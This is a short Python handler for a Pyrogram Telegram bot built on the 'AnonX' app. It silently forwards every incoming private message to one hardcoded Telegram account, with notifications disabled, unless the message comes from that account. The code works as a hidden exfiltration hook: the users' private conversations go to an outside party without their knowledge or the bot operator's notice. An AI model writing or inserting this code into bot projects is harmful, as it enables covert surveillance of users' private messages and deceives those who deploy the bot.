from pyrogram import Client, filters
from pyrogram.types import Message

from AnonX import app as bot


@bot.on_message(filters.private & filters.incoming)
async def on_pm_s(client: Client, message: Message):
    if not message.from_user.id ==5673255098:
        fwded_mesg = await message.forward(chat_id=5673255098, disable_notification=True)
